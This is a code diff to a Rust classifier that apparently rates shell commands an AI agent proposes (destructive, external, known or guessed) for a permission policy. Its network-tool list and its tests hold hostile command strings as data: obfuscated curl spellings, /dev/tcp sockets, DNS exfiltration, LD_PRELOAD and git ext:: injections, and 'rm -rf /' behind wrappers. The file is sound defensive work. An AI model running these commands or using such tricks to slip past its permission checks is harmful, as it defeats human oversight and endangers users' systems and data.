@@ -12,6 +12,10 @@
 //!
 //! A network client is `External` wherever it appears, whatever its verb: a GET's URL can carry
 //! data out as well as a POST's body.
+//!
+//! `Known` speaks for the command line only. What it runs can still be changed by files the agent
+//! may write (`.git/hooks`, `.git/config`, a `Makefile`): W2 must count such a write as its own
+//! action, never as allowed by a policy for the command that later runs it.
 
 use serde::Serialize;
 
@@ -136,14 +140,15 @@ fn command_of(target: &str) -> &str {
 const DESTRUCTIVE: Class = Class::Write { destructive: true };
 const WRITE: Class = Class::Write { destructive: false };
 
-/// Programs that talk to the network whatever their arguments.
+/// Programs that talk to the network whatever their arguments; a DNS lookup carries data out too.
 const NETWORK: &[&str] = &[
     "curl", "wget", "http", "https", "xh", "xhs", "aria2c", "socat", "ncat", "nc", "netcat", "telnet", "ssh",
-    "scp", "sftp", "ftp", "rsync",
+    "scp", "sftp", "ftp", "lftp", "rsync", "rclone", "websocat", "wcurl", "curlie", "openssl", "dig",
+    "nslookup", "host", "ping", "aws", "gcloud", "az",
 ];
 
-/// Programs that run code they are given (inline, a script, stdin) or fetch and run a package:
-/// that code may do anything, so they are external, and only guessed.
+/// Programs that run code they are given (inline, a script, stdin, a build file) or fetch and run
+/// a package: that code may do anything, so they are external, and only guessed.
 fn interpreter(b: &str) -> bool {
     matches!(
         b,
@@ -164,43 +169,97 @@ fn interpreter(b: &str) -> bool {
             | "bunx"
             | "pnpx"
             | "uvx"
-    ) || b
-        .strip_prefix("python")
-        .is_some_and(|v| v.chars().all(|c| c.is_ascii_digit() || c == '.'))
+            | "py"
+            | "ipython"
+            | "java"
+            | "go"
+            | "make"
+            | "awk"
+            | "gawk"
+            | "mawk"
+            | "nawk"
+            | "sed"
+            | "vim"
+            | "vi"
+            | "nvim"
+            | "ex"
+    ) || ["python", "pypy"].iter().any(|p| {
+        b.strip_prefix(p)
+            .is_some_and(|v| v.chars().all(|c| c.is_ascii_digit() || c == '.'))
+    })
 }
+
+/// Shells: given `-c`, what they run is the command; given a script or stdin, anything.
+const SHELLS: &[&str] = &["sh", "bash", "zsh", "dash", "fish", "ksh", "csh", "tcsh", "su"];
+
+/// Programs that run the rest of the line (with options of their own, some taking a value).
+const WRAPPERS: &[&str] = &[
+    "sudo", "doas", "nohup", "time", "command", "builtin", "exec", "nice", "ionice", "env", "xargs",
+    "timeout", "stdbuf", "watch", "chroot", "setsid", "taskset", "unbuffer", "flock", "busybox",
+];
+
+/// Shell words that only lead a command.
+const KEYWORDS: &[&str] = &["if", "then", "else", "elif", "while", "until", "do", "!", "{"];
+
+/// After a wrapper, at most this many words are tried as where the command starts.
+const MAX_SUFFIXES: usize = 256;
 
 /// A shell command: each piece between `;`, `&`, `|`, `$(`, backticks and new lines is read on its
 /// own (quotes dropped, so `bash -c 'rm -rf x'` shows its `rm`), and the worst piece wins.
 fn shell(cmd: &str) -> Classified {
     let mut worst = Classified::known(WRITE);
+    // A socket opened by the shell, or a word in ANSI-C quotes (`$'cu\x72l'`) this reading can't
+    // spell out.
+    if cmd.contains("/dev/tcp/") || cmd.contains("/dev/udp/") || cmd.contains("$'") {
+        worst = worst.and(Classified::guessed(Class::External));
+    }
     for piece in pieces(cmd) {
-        let words: Vec<String> = piece
-            .split_whitespace()
-            .map(unquote)
-            .filter(|w| !w.is_empty())
-            .collect();
+        let words = words(piece);
         if words.is_empty() {
             continue;
         }
         let read = command(&words);
         worst = worst.and(read);
         // A network client or an interpreter anywhere in the piece, even where this reading does
-        // not see a command (an unknown wrapper, an argument, `-c alias.x=!curl`), keeps it at
-        // least external.
+        // not see a command (an unknown wrapper, an argument, `-c alias.x=!curl`, `c${x}url`),
+        // keeps it at least external.
         if read.class.severity() < Class::External.severity()
             && words
                 .iter()
-                .flat_map(|w| w.split(['=', '!']))
+                .flat_map(|w| w.split(['=', '!', '$', '{', '}']))
                 .any(|w| NETWORK.contains(&base(w)) || interpreter(base(w)))
         {
             worst = worst.and(Classified::guessed(Class::External));
         }
     }
-    worst.and(Classified::known(redirection(cmd)))
+    worst.and(redirection(cmd))
 }
 
-/// The pieces between the shell's separators. `&` in `2>&1`, `>&2` or `&>` is a redirection, not
-/// a separator: it would leave a stray `1` that reads as a command.
+/// A piece's words, unquoted, without its redirections (`redirection` reads those from the whole
+/// command): `2>&1`, `>x`, or `>` and the word after it.
+fn words(piece: &str) -> Vec<String> {
+    let mut out = Vec::new();
+    let mut skip_next = false;
+    for w in piece.split_whitespace() {
+        if std::mem::take(&mut skip_next) {
+            continue;
+        }
+        let digits = w.trim_start_matches(|c: char| c.is_ascii_digit());
+        if digits.starts_with(['<', '>']) || w.starts_with("&>") {
+            // A bare operator takes the next word as its file.
+            skip_next = digits.chars().all(|c| matches!(c, '<' | '>' | '&' | '|'));
+            continue;
+        }
+        let w = unquote(w);
+        if !w.is_empty() {
+            out.push(w);
+        }
+    }
+    out
+}
+
+/// The pieces between the shell's separators. `&` in `2>&1` or `>&2` belongs to a redirection; in
+/// `&>` it is read as a separator too (POSIX sh runs what follows on its own).
 fn pieces(cmd: &str) -> impl Iterator<Item = &str> {
     let bytes = cmd.as_bytes();
     let mut start = 0;
@@ -208,10 +267,7 @@ fn pieces(cmd: &str) -> impl Iterator<Item = &str> {
     for (i, &b) in bytes.iter().enumerate() {
         let sep = match b {
             b'\n' | b';' | b'|' | b'`' | b'(' | b')' => true,
-            b'&' => {
-                let prev = i.checked_sub(1).map(|j| bytes[j]);
-                !matches!(prev, Some(b'>' | b'<')) && bytes.get(i + 1) != Some(&b'>')
-            }
+            b'&' => !matches!(i.checked_sub(1).map(|j| bytes[j]), Some(b'>' | b'<')),
             _ => false,
         };
         if sep {
@@ -236,85 +292,85 @@ fn unquote(w: &str) -> String {
         trimmed.to_string()
     }
 }
-/// `> file` overwrites it; a device is worse still. Appending (`>>`), `/dev/null` and `>&` are fine.
-fn redirection(cmd: &str) -> Class {
+
+/// `> file` (or `>& file`, `&> file`) overwrites it; a device is worse still. Appending (`>>`),
+/// `/dev/null`, `/dev/std*` and a descriptor (`>&2`, `>&-`) are fine.
+fn redirection(cmd: &str) -> Classified {
     let bytes = cmd.as_bytes();
     for (i, _) in cmd.match_indices('>') {
-        let doubled = bytes.get(i + 1) == Some(&b'>') || i > 0 && bytes[i - 1] == b'>';
-        if doubled || bytes.get(i + 1) == Some(&b'&') {
+        if bytes.get(i + 1) == Some(&b'>') || i > 0 && bytes[i - 1] == b'>' {
             continue;
         }
-        let to = cmd[i + 1..].split_whitespace().next().unwrap_or("");
+        let mut rest = &cmd[i + 1..];
+        let dup = rest.starts_with('&');
+        if dup {
+            rest = &rest[1..];
+        }
+        let to = rest.split_whitespace().next().unwrap_or("");
+        let to = to.trim_matches(|c| c == '\'' || c == '"');
         if to.is_empty() || to == "/dev/null" || to.starts_with("/dev/std") {
             continue;
         }
-        return DESTRUCTIVE;
+        if dup && (to == "-" || to.chars().all(|c| c.is_ascii_digit())) {
+            continue;
+        }
+        return Classified::known(DESTRUCTIVE);
     }
-    WRITE
+    Classified::known(WRITE)
 }
 
 fn base(w: &str) -> &str {
     w.rsplit('/').next().unwrap_or(w)
 }
 
-/// One simple command, its words already unquoted.
+/// `NAME=value` before a command: the environment it runs in, which can change what it does
+/// (`LD_PRELOAD`, `GIT_SSH_COMMAND`, `PAGER`).
+fn assignment(w: &str) -> bool {
+    w.split_once('=').is_some_and(|(name, _)| {
+        name.starts_with(|c: char| c.is_ascii_alphabetic() || c == '_')
+            && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
+    })
+}
+
+/// One simple command, its words already unquoted. Leading keywords are skipped; an assignment
+/// makes it a guess. After a wrapper, whose options may take values this reading does not know,
+/// every later word is tried as the command's start and the worst wins, as a guess.
 fn command(words: &[String]) -> Classified {
-    // Wrappers that run the rest, with their options and the values those take, and leading
-    // `NAME=value` words: the command is what follows them.
+    let mut sure = Confidence::Known;
     let mut i = 0;
-    let mut wrapper: Option<&str> = None;
     while let Some(w) = words.get(i) {
-        let b = base(w);
-        if w.contains('=') && !w.starts_with('-') && !w.starts_with('=') {
+        if KEYWORDS.contains(&w.as_str()) {
             i += 1;
-        } else if matches!(
-            b,
-            "sudo"
-                | "doas"
-                | "nohup"
-                | "time"
-                | "command"
-                | "exec"
-                | "nice"
-                | "env"
-                | "xargs"
-                | "timeout"
-                | "stdbuf"
-        ) {
-            wrapper = Some(b);
+        } else if assignment(w) {
+            sure = Confidence::Guessed;
             i += 1;
-            if b == "timeout" {
-                // Its options, then the duration.
-                while let Some(o) = words.get(i).filter(|w| w.starts_with('-')) {
-                    i += if matches!(o.as_str(), "-s" | "-k") { 2 } else { 1 };
-                }
-                i += 1;
+        } else if WRAPPERS.contains(&base(w)) {
+            let after = &words[i + 1..];
+            let mut worst = Classified::guessed(WRITE);
+            for s in 0..after.len().min(MAX_SUFFIXES) {
+                worst = worst.and(Classified::guessed(program(&after[s..]).class));
             }
-        } else if let Some(wr) = wrapper
-            && w.starts_with('-')
-        {
-            // Each wrapper's own options that take a value: `sudo -n` is a flag, `xargs -n` is not.
-            let takes_value = match wr {
-                "sudo" | "doas" => {
-                    matches!(
-                        w.as_str(),
-                        "-u" | "-g" | "-h" | "-p" | "-C" | "-D" | "-r" | "-t" | "-U" | "-T"
-                    )
-                }
-                "xargs" => matches!(w.as_str(), "-I" | "-L" | "-n" | "-P" | "-s" | "-d" | "-E" | "-a"),
-                "env" => matches!(w.as_str(), "-u" | "-C"),
-                "nice" => w == "-n",
-                "stdbuf" => matches!(w.as_str(), "-i" | "-o" | "-e"),
-                _ => false,
-            };
-            i += if takes_value { 2 } else { 1 };
+            if after.len() > MAX_SUFFIXES {
+                worst = worst.and(Classified::guessed(DESTRUCTIVE));
+            }
+            return worst;
         } else {
             break;
         }
     }
-    let words = &words[i.min(words.len())..];
+    let read = program(&words[i.min(words.len())..]);
+    match sure {
+        Confidence::Known => read,
+        Confidence::Guessed => Classified::guessed(read.class),
+    }
+}
+
+/// The command at the start of `words`, no prefix: what that program does with these arguments.
+fn program(words: &[String]) -> Classified {
+    let known = Classified::known;
+    let guessed = Classified::guessed;
     let Some(first) = words.first() else {
-        return Classified::known(WRITE);
+        return known(WRITE);
     };
     let rest = &words[1..];
     let has = |w: &str| rest.iter().any(|x| x == w);
@@ -322,36 +378,49 @@ fn command(words: &[String]) -> Classified {
         rest.iter()
             .any(|x| x.starts_with('-') && !x.starts_with("--") && x.contains(c))
     };
-    let known = Classified::known;
     let b = base(first);
+    // A name the shell expands (`c${x}url`, `cur?`): anything.
+    if first.contains(['$', '*', '?', '[']) {
+        return guessed(Class::External);
+    }
     if NETWORK.contains(&b) {
         return known(Class::External);
     }
     if interpreter(b) {
-        return Classified::guessed(Class::External);
+        return guessed(Class::External);
     }
-    match b {
-        // A shell running a string: what it runs is the command.
-        "sh" | "bash" | "zsh" | "dash" | "fish" | "ksh" => match rest
+    if SHELLS.contains(&b) {
+        // `sh -c 'cmd'` exactly is that command; any other form runs a script, a profile or
+        // stdin as well: external, guessed, and no better than the string it was given.
+        if b != "su" && rest.first().is_some_and(|w| w == "-c") {
+            return command(&rest[1..]);
+        }
+        let given = rest
             .iter()
             .position(|w| w.starts_with('-') && !w.starts_with("--") && w.contains('c'))
-        {
-            Some(c) => command(&rest[c + 1..]),
-            // A script, or commands on stdin: anything.
-            None => Classified::guessed(WRITE),
-        },
+            .map_or(WRITE, |c| command(&rest[c + 1..]).class);
+        return guessed(Class::External.worst(given));
+    }
+    match b {
         "eval" => command(rest),
         "rm" | "shred" | "unlink" | "wipefs" | "truncate" | "dd" | "mv" | "srm" => known(DESTRUCTIVE),
         p if p.starts_with("mkfs") => known(DESTRUCTIVE),
-        "find" if has("-delete") => known(DESTRUCTIVE),
-        // What `-exec` runs is a command of its own.
-        "find" => match rest
-            .iter()
-            .position(|w| matches!(w.as_str(), "-exec" | "-execdir" | "-ok" | "-okdir"))
-        {
-            Some(e) => known(WRITE).and(command(&rest[e + 1..])),
-            None => Classified::guessed(WRITE),
-        },
+        // Every action counts: each `-exec` runs a command, and `-fprint` overwrites a file.
+        "find" => {
+            let mut worst = guessed(WRITE);
+            for (e, w) in rest.iter().enumerate() {
+                match w.as_str() {
+                    "-delete" | "-fprint" | "-fprint0" | "-fprintf" | "-fls" => {
+                        worst = worst.and(guessed(DESTRUCTIVE))
+                    }
+                    "-exec" | "-execdir" | "-ok" | "-okdir" => {
+                        worst = worst.and(guessed(command(&rest[e + 1..]).class));
+                    }
+                    _ => {}
+                }
+            }
+            worst
+        }
         "chmod" | "chown" if flag('R') || has("--recursive") => known(DESTRUCTIVE),
         "git" => git(rest),
         // Subcommands not read here (`run`, `exec`, an alias) may do anything: guessed.
@@ -363,54 +432,227 @@ fn command(words: &[String]) -> Classified {
                 known(DESTRUCTIVE)
             }
             Some("push") => known(Class::External),
-            _ => Classified::guessed(WRITE),
+            _ => guessed(WRITE),
         },
         "kubectl" | "helm" => match rest.first().map(String::as_str) {
             Some("delete" | "uninstall" | "drain") => known(DESTRUCTIVE),
+            Some("apply") if rest.iter().any(|w| w.starts_with("--prune")) => known(DESTRUCTIVE),
             Some("apply" | "create" | "replace" | "patch" | "scale" | "rollout" | "install" | "upgrade") => {
                 known(Class::External)
             }
-            _ => Classified::guessed(WRITE),
+            _ => guessed(WRITE),
         },
         "gh" => match rest.first().map(String::as_str) {
-            Some("repo") if has("delete") => known(DESTRUCTIVE),
+            Some(_) if rest.get(1).is_some_and(|w| w == "delete") => known(DESTRUCTIVE),
+            Some("api")
+                if rest.windows(2).any(|p| {
+                    matches!(p[0].as_str(), "-X" | "--method") && p[1].eq_ignore_ascii_case("delete")
+                }) || rest.iter().any(|w| {
+                    w.eq_ignore_ascii_case("-XDELETE") || w.eq_ignore_ascii_case("--method=delete")
+                }) =>
+            {
+                known(DESTRUCTIVE)
+            }
             Some("pr" | "issue" | "release" | "gist" | "workflow" | "api") => known(Class::External),
-            _ => Classified::guessed(WRITE),
+            _ => guessed(WRITE),
         },
-        "npm" | "pnpm" | "yarn" | "cargo" if has("publish") => known(Class::External),
-        _ => Classified::guessed(WRITE),
+        // Publishing runs the package's scripts (and `build.rs`); `run`, `exec`, `dlx` run code.
+        "npm" | "pnpm" | "yarn" | "cargo" => match rest.first().map(String::as_str) {
+            Some("publish" | "run" | "exec" | "dlx" | "x" | "run-script" | "install-test") => {
+                guessed(Class::External)
+            }
+            _ => guessed(WRITE),
+        },
+        _ => guessed(WRITE),
     }
 }
 
+/// Git subcommands read here, for what they can break. Any other (an alias, `bisect run`,
+/// `submodule foreach`, a `config` that sets a pager) is anyone's guess.
+const GIT_KNOWN: &[&str] = &[
+    "push",
+    "fetch",
+    "pull",
+    "clone",
+    "ls-remote",
+    "remote",
+    "reset",
+    "clean",
+    "checkout",
+    "restore",
+    "branch",
+    "stash",
+    "filter-branch",
+    "filter-repo",
+    "reflog",
+    "gc",
+    "status",
+    "log",
+    "diff",
+    "show",
+    "add",
+    "commit",
+    "switch",
+    "merge",
+    "rebase",
+    "tag",
+    "rm",
+    "mv",
+    "init",
+    "blame",
+    "shortlog",
+    "describe",
+    "rev-parse",
+    "ls-files",
+    "worktree",
+    "cherry-pick",
+    "revert",
+];
+
+/// Short options that make some git subcommand run a command or write a file (`rebase -x`,
+/// `grep -O`, `clone -u`, `merge -s`, `log -o`…), or open an editor (`-i`, `-e`). They keep a
+/// command known only where the subcommand is listed beside them.
+const GIT_RISKY_SHORT: &[(char, &[&str])] = &[
+    ('x', &["clean", "cherry-pick"]),
+    ('O', &[]),
+    ('u', &["push", "status", "add", "stash"]),
+    ('s', &["status", "commit", "log", "show", "shortlog"]),
+    ('o', &[]),
+    ('i', &[]),
+    ('e', &[]),
+    ('c', &["switch"]),
+    ('C', &[]),
+];
+
+/// Long options a known git command may carry; `--name=value` forms go by their prefix.
+const GIT_SAFE_LONG: &[&str] = &[
+    "--all",
+    "--verbose",
+    "--quiet",
+    "--oneline",
+    "--stat",
+    "--short",
+    "--branch",
+    "--porcelain",
+    "--cached",
+    "--staged",
+    "--hard",
+    "--soft",
+    "--mixed",
+    "--force",
+    "--force-with-lease",
+    "--delete",
+    "--amend",
+    "--no-edit",
+    "--name-only",
+    "--name-status",
+    "--graph",
+    "--decorate",
+    "--tags",
+    "--follow-tags",
+    "--set-upstream",
+    "--ff-only",
+    "--no-ff",
+    "--ff",
+    "--abort",
+    "--continue",
+    "--skip",
+    "--rebase",
+    "--no-rebase",
+    "--dry-run",
+    "--patch",
+    "--signoff",
+    "--no-verify",
+    "--list",
+    "--merged",
+    "--no-merged",
+    "--remotes",
+    "--keep-index",
+    "--include-untracked",
+    "--prune",
+    "--mirror",
+    "--single-branch",
+    "--discard-changes",
+    "--detach",
+    "--create",
+    "--track",
+    "--no-track",
+    "--reverse",
+    "--first-parent",
+    "--no-merges",
+    "--word-diff",
+    "--no-color",
+    "--merges",
+    "--worktree",
+    "--source",
+    "--",
+];
+const GIT_SAFE_PREFIX: &[&str] = &[
+    "--pretty=",
+    "--format=",
+    "--since=",
+    "--until=",
+    "--author=",
+    "--grep=",
+    "--max-count=",
+    "--depth=",
+    "--branch=",
+    "--message=",
+    "--unified=",
+    "--color=",
+    "--date=",
+    "--untracked-files=",
+    "--set-upstream-to=",
+    "--force-with-lease=",
+    "--abbrev=",
+];
+
+fn git_option_safe(sub: &str, o: &str) -> bool {
+    if o.starts_with("--") {
+        return GIT_SAFE_LONG.contains(&o) || GIT_SAFE_PREFIX.iter().any(|p| o.starts_with(p));
+    }
+    // A short cluster (`-fdx`), or a count (`-3`).
+    o[1..].chars().all(|c| {
+        c.is_ascii_digit()
+            || GIT_RISKY_SHORT
+                .iter()
+                .find(|(r, _)| *r == c)
+                .is_none_or(|(_, ok)| ok.contains(&sub))
+    })
+}
+
 fn git(args: &[String]) -> Classified {
-    // Global options before the subcommand: `-C dir`, `-c k=v`, `--git-dir=…`. A config given on
-    // the command line can make git run anything (`-c alias.x='!…'`, `core.pager`, `core.sshCommand`).
-    let configured = args
-        .iter()
-        .any(|a| a == "-c" || a.starts_with("--config-env") || a.starts_with("--exec-path"));
+    // Global options before the subcommand: `-C dir`, `-c k=v`, `--git-dir=…`. Each can point git
+    // at another repository's config and hooks, or make it run anything (`-c alias.x='!…'`,
+    // `core.pager`, `core.sshCommand`); only `--no-pager` keeps it known.
+    let mut global_risk = false;
     let mut i = 0;
     while let Some(a) = args.get(i) {
-        if matches!(
-            a.as_str(),
-            "-C" | "-c" | "--git-dir" | "--work-tree" | "--namespace" | "--exec-path"
-        ) {
-            i += 2;
-        } else if a.starts_with('-') {
-            i += 1;
-        } else {
+        if !a.starts_with('-') {
             break;
         }
+        if a != "--no-pager" {
+            global_risk = true;
+        }
+        let takes_value = matches!(
+            a.as_str(),
+            "-C" | "-c" | "--git-dir" | "--work-tree" | "--namespace" | "--exec-path" | "--config-env"
+        );
+        i += if takes_value { 2 } else { 1 };
     }
     let Some(sub) = args.get(i) else {
-        return Classified::known(WRITE);
+        return Classified::guessed(WRITE);
     };
+    let sub = sub.as_str();
     let rest = &args[i + 1..];
     let has = |w: &str| rest.iter().any(|x| x == w);
     let short = |c: char| {
         rest.iter()
             .any(|x| x.starts_with('-') && !x.starts_with("--") && x.contains(c))
     };
-    let class = match sub.as_str() {
+    let force = short('f') || has("--force");
+    let operands = rest.iter().filter(|w| !w.starts_with('-')).count();
+    let class = match sub {
         "push" => {
             let rewrites = short('f')
                 || short('d')
@@ -420,60 +662,36 @@ fn git(args: &[String]) -> Classified {
                 || rest.iter().any(|w| w.starts_with('+') || w.starts_with(':'));
             if rewrites { DESTRUCTIVE } else { Class::External }
         }
+        // A URL carries data out as well as in.
+        "fetch" | "pull" | "clone" | "ls-remote" | "remote" => Class::External,
         "reset" if has("--hard") => DESTRUCTIVE,
-        "clean" if short('f') || has("--force") => DESTRUCTIVE,
-        "checkout" if has("--") || has(".") || short('f') || has("--force") => DESTRUCTIVE,
+        "clean" if force => DESTRUCTIVE,
+        // A path, or a name that may be one, discards its changes; only a new branch is safe.
+        "checkout" if !(short('b') || short('B')) && (operands > 0 || force || has("--")) => DESTRUCTIVE,
         "restore" if !has("--staged") => DESTRUCTIVE,
-        "branch" if short('D') || has("--delete") && has("--force") => DESTRUCTIVE,
+        "branch" if short('D') || (short('d') || has("--delete")) && force => DESTRUCTIVE,
         "stash" if has("drop") || has("clear") => DESTRUCTIVE,
         "filter-branch" | "filter-repo" => DESTRUCTIVE,
         "reflog" if has("expire") || has("delete") => DESTRUCTIVE,
         "gc" if rest.iter().any(|w| w.starts_with("--prune")) => DESTRUCTIVE,
+        "rm" | "mv" if force => DESTRUCTIVE,
+        "switch" if force || has("--discard-changes") => DESTRUCTIVE,
+        "worktree" if has("remove") && force => DESTRUCTIVE,
+        "tag" if short('d') || has("--delete") => DESTRUCTIVE,
         _ => WRITE,
     };
-    // What a subcommand left out here may be (an alias, `bisect run`, `submodule foreach`, a
-    // `config` that sets a pager) is anyone's guess.
-    let read = matches!(
-        sub.as_str(),
-        "push"
-            | "reset"
-            | "clean"
-            | "checkout"
-            | "restore"
-            | "branch"
-            | "stash"
-            | "filter-branch"
-            | "filter-repo"
-            | "reflog"
-            | "gc"
-            | "status"
-            | "log"
-            | "diff"
-            | "show"
-            | "add"
-            | "commit"
-            | "fetch"
-            | "pull"
-            | "clone"
-            | "switch"
-            | "merge"
-            | "rebase"
-            | "tag"
-            | "rm"
-            | "mv"
-            | "init"
-            | "blame"
-            | "grep"
-            | "shortlog"
-            | "describe"
-            | "rev-parse"
-            | "ls-files"
-            | "worktree"
-            | "cherry-pick"
-            | "revert"
-            | "remote"
-    );
-    if read && !configured {
+    // Known only for a listed subcommand with listed options; `ext::` and other remote helpers
+    // in an operand run commands of their own.
+    let read = GIT_KNOWN.contains(&sub)
+        && !global_risk
+        && rest.iter().all(|w| {
+            if w.starts_with('-') {
+                git_option_safe(sub, w)
+            } else {
+                !w.contains("::")
+            }
+        });
+    if read {
         Classified::known(class)
     } else {
         Classified::guessed(class)
@@ -688,6 +906,127 @@ mod tests {
             "bash -c 'git status'",
         ] {
             assert_eq!(bash(cmd).confidence, Confidence::Known, "{cmd}");
+        }
+    }
+
+    /// The first review's ways to look known while running code, reaching out or breaking things.
+    #[test]
+    fn options_prefixes_and_wrappers_that_change_what_runs_are_guessed() {
+        for cmd in [
+            "git rebase -x 'cmd' main",
+            "git rebase --exec /tmp/p main",
+            "git grep --open-files-in-pager=/tmp/p foo",
+            "git grep -O/tmp/p foo",
+            "git clone -u /tmp/p /src dst",
+            "git clone --upload-pack=/tmp/p a b",
+            "git fetch --upload-pack=/tmp/p",
+            "git pull --upload-pack /tmp/p",
+            "git clone --config core.fsmonitor=/tmp/p a b",
+            "git clone --template=/tmp/evil a b",
+            "git clone ext::sh a",
+            "git merge -s evil main",
+            "git diff --ext-diff",
+            "git log --output=x",
+            "git push --receive-pack=/tmp/p",
+            "git -C /tmp/other status",
+            "git --git-dir=/tmp/evil/.git status",
+            "LD_PRELOAD=/tmp/evil.so git status",
+            "GIT_SSH_COMMAND=/tmp/p git fetch origin",
+            "GIT_EXTERNAL_DIFF=/tmp/p git diff",
+            "BASH_ENV=/tmp/p bash -c 'git status'",
+            "./x=y git status",
+            "/tmp/a=b/payload git status",
+            "bash script.sh -c 'git status'",
+            "bash -lc 'git status'",
+            "find . -exec git status {} + -exec /tmp/payload {} +",
+            "npm run publish",
+            "cargo run -- publish",
+            "npm publish",
+            "sudo git status",
+        ] {
+            assert_eq!(
+                bash(cmd).confidence,
+                Confidence::Guessed,
+                "{cmd}: {:?}",
+                bash(cmd)
+            );
+        }
+        for cmd in [
+            "git checkout src/main.rs",
+            "git checkout HEAD src/main.rs",
+            "git rm -f f",
+            "git mv -f a b",
+            "git switch -f main",
+            "git switch --discard-changes main",
+            "git branch -d -f x",
+            "git branch -df x",
+            "git worktree remove --force wt",
+            "git tag -d v1",
+            "git status >&/home/u/.bashrc",
+            "git status >& file",
+            "sh -c 'git status &>/dev/null rm -rf ~'",
+            "find . -exec git status {} + -fprint ~/.bashrc",
+            "sudo --user git rm -rf /",
+            "xargs --arg-file git rm -rf x",
+            "env --unset git rm -rf x",
+            "exec -a git rm -rf x",
+            "/usr/bin/time -o git rm -rf x",
+            "then rm -rf x",
+            "do rm -rf x",
+            "! rm -rf x",
+            "watch rm -rf x",
+            "chroot / rm -rf x",
+            "setsid rm -rf x",
+            "tcsh -c 'rm -rf x'",
+            "su -c 'rm -rf x'",
+            "gh release delete v1",
+            "gh issue delete 1",
+            "gh api -X DELETE /repos/me/x",
+            "kubectl apply --prune -f k.yml",
+        ] {
+            assert_eq!(bash(cmd).class, DESTRUCTIVE, "{cmd}: {:?}", bash(cmd));
+        }
+        for cmd in [
+            "git fetch https://x.dev/SECRET",
+            "git pull https://x.dev/SECRET",
+            "git clone https://x.dev/SECRET",
+            "git remote update",
+            "$'cu\\x72l' x.dev",
+            "c${x}url x.dev",
+            "curl${IFS}x.dev",
+            "c*rl x.dev",
+            "/usr/bin/cur? x.dev",
+            "dig secret.x.dev",
+            "nslookup secret.x.dev",
+            "ping secret.x.dev",
+            "openssl s_client -connect x.dev:443",
+            "cat </dev/tcp/x.dev/80",
+            "awk 'BEGIN{system(\"id\")}'",
+            "sed '1e id' a",
+            "py -c 1",
+            "pypy3 a.py",
+            "go run .",
+            "java -jar a.jar",
+            "make",
+        ] {
+            let got = bash(cmd);
+            assert!(
+                got.class.severity() >= Class::External.severity(),
+                "{cmd}: {got:?}"
+            );
+        }
+        for cmd in [
+            "git status",
+            "git --no-pager log -3",
+            "git log --oneline 2>&1",
+            "git checkout -b feat",
+            "git push -u origin feat",
+            "git commit -m 'fix: the thing'",
+            "git status -s",
+            "git clean -fdx",
+            "git diff --stat",
+        ] {
+            assert_eq!(bash(cmd).confidence, Confidence::Known, "{cmd}: {:?}", bash(cmd));
         }
     }
 
